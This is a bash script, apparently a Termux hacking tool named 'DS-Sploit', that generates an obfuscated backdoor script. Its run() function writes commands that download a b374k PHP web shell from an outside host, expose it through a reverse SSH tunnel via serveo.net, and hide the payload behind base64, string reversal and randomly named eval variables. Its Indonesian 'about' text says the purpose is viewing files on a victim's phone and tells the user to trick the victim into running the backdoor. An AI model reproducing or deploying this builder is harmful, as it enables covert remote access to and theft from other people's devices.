R='\033[1;31m'
W='\033[1;37m'
echo $W"Starting..."
sleep 3
cd() {
echo $W
echo "       / .'"
echo ' .---. \/' $R"DS-Sploit"$W
echo "(._.' \()" $R"Coded By D3r2y"$W
echo ' ^"""^"'
echo "["$R"+$W"] indonesiatoworld.org ["$R"+$W"]"
echo
}
tab() {
echo +----------------------+
}
run2() {
printf $R"D3r2y"$W" >> ";read act2
if [ "$act2" = "run" ]
then
run
else
echo $R"Unknown Command !!"$W
run2
fi
}
act3() {
read -p "Masukkan Script Bash?(y/n): " act3
if [ "$act3" = "y" ]; then
read -p "You Script Bash?: " sc
cat $sc >> $name
elif [ "$act3" = "n" ]; then
echo $W"OK ^_^"
else
echo $W"Unknown Command!!"
act3
fi
}
clear
touch() {
printf $R"D3r2y"$W" >> ";read act
if [ "$act" = "help" ]; then
tab
echo "| Name  | Description  |"
tab
echo "| set   | Set Backdoor |"
echo "| run   | Start Create |"
echo "| help  | Help Command |"
echo "| about | about this   |"
echo "| exit  | Exit !! :)   |"
tab
touch
elif [ $act = run ]; then
echo $W"Setting Dulu Gblk!"
touch
elif [ $act = set ]; then
read -p "Set Subdomain > " subdo
read -p "Set Name > " name
run2
elif [ $act = exit ]; then
echo $R"Exiting !!"
exit 1
elif [ $act = about ]; then
about
touch
else
echo $R"Unknown Command !!"$W
touch
fi
}
about() {
echo "Ver DS : v1.0"
echo "Author : Derry Wadowlsky"
echo "Team   : Indonesia To World"
echo "Visit  : www.indonesiatoworld.org"
echo
echo 'Tool Sederhana Ini Buat Ngeliat File Di Hp Korban Via Shell Gan,\nWalupun Termux Udah Diexit Data Internet Masih Nyala, & Belom Dikill Prosesnya,\nTool Ini Tetep Jalan Gan (Background)\nNah Disini Lu Juga Harus Socengin Korban Lo :""v\nSuruh Dia Run Backdoor Lo'
touch
}
run() {
echo "["$R"INFO"$W"] Starting Create Backdoor..."
echo "pkg install ssh -y" >> dsploit
echo "pkg install php -y" >> dsploit
echo "pkg install wget -y" >> dsploit
echo "wget -q -O d3r2y.php http://karet.000webhostapp.com/b374k.txt" >> dsploit
echo "ssh -R $subdo:80:localhost:1337 serveo.net > /dev/null 2>&1 &" >> dsploit
echo "php -S localhost:1337 > /dev/null 2>&1 &" >> dsploit
randm1=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm2=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm3=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm4=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm5=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm6=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm7=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm8=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm9=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm10=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm11=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm12=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm13=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm14=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm15=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm16=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm17=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm18=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm19=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm20=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm21=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm22=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm23=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm24=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm25=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm26=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm27=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm28=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm29=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm30=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm31=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
randm32=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 100 | head -n 1)
	anu=$(cat dsploit | base64 | tr -d '\n' )
	anu=$(echo "$anu" | rev)
	nasa="$randm1=\"$randm2\";$randm3=\"$randm4\";$randm5=\"ch\";$randm6=\"4\";$randm7=\"\";$randm9=\"$randm10\";$randm11=\" $anu | r\";$randm12=\"$randm13\";$randm14=\"\";$randm15=\"as\";$randm16=\"$randm17\";$randm18=\"$randm19\";$randm20=\"o\";$randm21=\"6\";$randm22=\"$randm23\";$randm24=\" -d\";$randm25=\"$randm26\";$randm27=\"\";$randm28=\"b\";$randm29=\"e\";$randm30=\"v |\";Tx="Eds";$randm31=\"\""
de=''"$randm32"'=$(eval '"\"\$$randm14\$$randm29\$$randm5\$$randm7\$$randm20\$$randm11\$$randm29\$$randm30\$$randm14\$$randm28\$$randm31\$$randm15\$$randm29\$$randm21\$$randm7\$$randm6\$$randm24\$$randm31\""')'
zc='eval '"\"\$$randm27\$$randm32\$$randm14\$$randm7\""''
  printf "#!/bin/bash\n" >> $name
	printf "$nasa;$de;$zc" >> $name
act3
rm dsploit
echo "["$R"INFO"$W"]"$R" Success"$W" Create Backdoor !"
sleep 1
echo "["$R"INFO"$W"] Name >>"$R" $name"$W
sleep 2
echo "["$R"INFO"$W"] Shell >> "$R"http://$subdo.serveo.net/d3r2y.php"$W
}